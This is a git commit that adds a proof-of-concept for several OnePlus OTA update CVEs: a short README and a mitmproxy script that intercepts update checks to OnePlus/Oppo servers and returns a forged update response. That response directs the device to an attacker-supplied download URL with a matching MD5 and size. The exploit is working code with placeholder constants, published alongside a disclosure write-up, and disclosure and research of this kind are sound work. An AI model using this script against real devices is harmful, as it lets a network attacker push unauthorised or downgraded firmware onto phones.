88d1fcc108f14befbc36d22b663dbc578e3cb2b5
Roee Hay <roeehay@gmail.com>
2017-05-11 18:44:37 +0300

    Added the OnePlus OTA PoC

---
+++ OnePlusOTA/README.md
@@ -0,0 +1,7 @@
+# PoC for CVE-2017-5948 /CVE-2017-8850 / CVE-2017-8851 / CVE-2016-10370
+
+Replace the relevent constants and run with `mitmdump`:
+ 
+Blog post can be found [here](https://alephsecurity.com/2017/05/10/oneplus-ota/)
+
+
---
+++ OnePlusOTA/mitmota.py
@@ -0,0 +1,23 @@
+URL = "<url>"
+MD5 = "<md5>"
+SIZE= "<size>"
+
+def response(flow):
+  if "h2os" in flow.request.pretty_url or "coloros" in flow.request.pretty_url:
+    print(flow.request.pretty_url)
+    flow.response.status_code=200
+    flow.response.headers["Content-Type"] = "application/json;charset=UTF-8"
+    flow.response.headers["Connection"] = "close"
+    flow.response.content = b"{\"type\":\"1\",\
+                               \"wipe\":\"0\",\
+                               \"new_version\":\"foo\",\
+                               \"version_name\":\"foo!\",
+                               \"description\":\"foo\",\
+                               \"extract\":\"foo\",\
+                               \"patch_name\":\"foo.zip\",\
+                               \"patch_md5\":\"%s\",\
+                               \"patch_size\":\"%s\",\
+                               \"down_url\":\"%s\",\
+                               \"active_url\":\"%s\",\
+                               \"recommend\":\"100\",\
+                               \"share\":\"foo\"}" % (MD5, SIZE, URL, URL)
